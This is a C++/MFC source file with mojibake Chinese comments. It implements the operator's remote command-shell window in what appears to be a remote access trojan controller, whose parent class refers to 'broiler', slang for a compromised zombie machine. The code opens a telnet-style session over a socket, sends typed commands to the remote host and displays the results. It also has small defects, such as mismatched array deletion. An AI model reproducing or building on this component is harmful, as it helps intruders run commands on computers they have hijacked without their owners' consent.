// CmdShell.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "CmdShell.h"
#include "BroilerData.h"

static UINT idArray[] = {ID_RES_CMD1,     //״̬��
                         ID_RES_CMD2};
// CCmdShell �Ի���

IMPLEMENT_DYNAMIC(CCmdShell, CDialog)

CCmdShell::CCmdShell(CWnd* pParent /*=NULL*/, SOCKET l_socket, CString strTitle)
	: CDialog(CCmdShell::IDD, pParent)
{
	m_socket = l_socket;
	m_bReadOnly = true;
	m_strShowMsg = _T("");
	m_strTitle = strTitle;
}

CCmdShell::~CCmdShell()
{
	if (NULL != m_pfont)
	{
		delete m_pfont;
	}
}

void CCmdShell::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD_RECV, m_cmdRecvCtrl);
	DDX_Control(pDX, IDC_EDIT_CMD_SEND, m_cmdSendCtrl);
}


BEGIN_MESSAGE_MAP(CCmdShell, CDialog)
	ON_BN_CLICKED(IDC_BTN_CMD_SEND, &CCmdShell::OnBnClickedBtnCmdSend)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CCmdShell ��Ϣ�������
BOOL CCmdShell::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CCmdShell::DlgInit()
{
	m_Brush.CreateSolidBrush(RGB(0,0,0));  //��ɫ�Ļ�ˢ
	m_pfont = new CFont; 
	m_pfont->CreateFont(14, // nHeight 
		0, // nWidth 
		0, // nEscapement 
		0, // nOrientation 
		FW_NORMAL, // nWeight 
		FALSE, // bItalic 
		FALSE, // bUnderline 
		0, // cStrikeOut 
		ANSI_CHARSET, // nCharSet 
		OUT_DEFAULT_PRECIS, // nOutPrecision 
		CLIP_DEFAULT_PRECIS, // nClipPrecision 
		DEFAULT_QUALITY, // nQuality 
		DEFAULT_PITCH | FF_SWISS, // nPitchAndFamily 
		_T("Arial")); // lpszFac   //Arial
	GetDlgItem(IDC_EDIT_CMD_RECV)->SetFont(m_pfont);

	//���öԻ���ı���
	CString strTitle = _T("Զ���ն�  \\\\");
	strTitle += m_strTitle;
	SetWindowText(strTitle);

	//���öԻ����ͼ��
	HICON m_hIcon;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_CMD);//IDR_ICONΪͼ����Դ��
	SetIcon(m_hIcon, FALSE); // Set small icon

	//״̬��
	m_cmdStatusBar.Create(this);
	m_cmdStatusBar.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_cmdStatusBar.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 200);
	m_cmdStatusBar.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 200);
	m_cmdStatusBar.SetPaneText(0 , _T("����"));
	m_cmdStatusBar.SetPaneText(1 , _T(""));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //��ʾ��������״̬������仰һ��Ҫ����, ���򹤾�������ʾ��

    MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_TELNET;
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

HBRUSH CCmdShell::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����
    if (IDC_EDIT_CMD_RECV == pWnd->GetDlgCtrlID() && CTLCOLOR_EDIT == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,252,0));  //������ɫ
		pDC->SetBkColor(RGB(0,0,0));  //�����ı�����ɫ
		pDC->SetBkMode(TRANSPARENT);  //���ñ���͸��
		hbr = (HBRUSH)m_Brush;
	}
	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}

BOOL CCmdShell::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey)  //�س���
		{
			//������Ϣ
			if (m_cmdSendCtrl.GetSafeHwnd() == ::GetFocus())  //��ǰ�����ǲ����ڷ����ı��ؼ���
			{
				SendCommond();
			}
			return TRUE;
		}
		else if (VK_ESCAPE == nVirtKey || VK_RETURN == nVirtKey)  //ESC����
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CCmdShell::OnBnClickedBtnCmdSend()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	SendCommond();
}

void CCmdShell::SendCommond()
{
	int nLength = m_cmdSendCtrl.GetWindowTextLength();  //��ȡ����
	if (0 == nLength)
	{
		return ;
	}
	CString strCMDline = _T("");
	GetDlgItemText(IDC_EDIT_CMD_SEND, strCMDline);  //����
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	COMMOND_C tagCMD;
	memset(&tagCMD, 0, sizeof(COMMOND_C));
	tagCMD.flag = 0;
	CStringToChar(strCMDline, tagCMD.command);
	if (0 == strcmp(tagCMD.command, "exit"))  //�����������exit������˳���
	{
		SendMessageW(WM_CLOSE, 0, 0); //�����˳�
		return ;
	}
	tagMsgInfo.nMsgCmd = CMD_COMMOND;
	strcat_s((char*)tagCMD.command, sizeof(tagCMD.command), "\r\n");   //������ipconfig \r\n �س�����
	memcpy((char*)tagMsgInfo.context, (char*)&tagCMD, sizeof(COMMOND_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);

	CString strInfo = _T("");
	if (bSuccess)  //���ͳɹ�
	{
		strInfo = _T("CMD����ͳɹ�!");
	}
	else
	{
		strInfo = _T("CMD�����ʧ��!");
	}
	TCHAR* pText = strInfo.GetBuffer(strInfo.GetLength());
	::SendMessage(this->m_cmdStatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pText);
	strInfo.ReleaseBuffer();
	GetDlgItem(IDC_EDIT_CMD_SEND)->SetWindowText(_T(""));
}

void CCmdShell::SetReturnInfo(IN COMMOND_C tagCmdInfo)
{
	if (0 == tagCmdInfo.flag)
	{
		CString strRet = _T("");
		strRet = CharToCString(tagCmdInfo.command);
		m_strShowMsg += strRet;
		m_cmdRecvCtrl.SetWindowText(m_strShowMsg);
		m_cmdRecvCtrl.SetSel(-1);
		m_cmdSendCtrl.GetFocus();
	}
}

//CStringתchar
void CCmdShell::CStringToChar(IN CString str, OUT char* w)
{
	int len = WideCharToMultiByte(CP_ACP,0,str,str.GetLength(),NULL,0,NULL,NULL);
	WideCharToMultiByte(CP_ACP,0,str,str.GetLength(),w,len,NULL,NULL);
	w[len] = '\0';
}

//char ת���� CString
CString CCmdShell::CharToCString(char* result)
{
	//��char ת��Ϊ CString�ַ�
	DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, result, -1, NULL, 0);
	wchar_t *pwText;
	pwText = new wchar_t[dwNum];
	if (!pwText)
	{
		delete []pwText;
		return NULL;
	}
	MultiByteToWideChar (CP_ACP, 0, result, -1, pwText, dwNum);// ��ʼת��
	CString cstr = pwText;
	delete pwText;
	return cstr;
}

void CCmdShell::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	((CBroilerData*)this->m_pParentWnd)->m_pCmdShellDlg = NULL;
	delete this;
}

void CCmdShell::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_COMMOND;

	COMMOND_C tagCmdInfo;
	memset(&tagCmdInfo, 0, sizeof(COMMOND_C));
	tagCmdInfo.flag = 0;

	char cQuitMsg[] = "exit\r\n";
	strcpy_s((char*)tagCmdInfo.command, sizeof(cQuitMsg), (char*)cQuitMsg);
	memcpy((char*)tagMsgInfo.context, (char*)&tagCmdInfo, sizeof(COMMOND_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);

	((CBroilerData*)this->m_pParentWnd)->m_pCmdShellDlg = NULL;
	DestroyWindow();
	delete this;
}
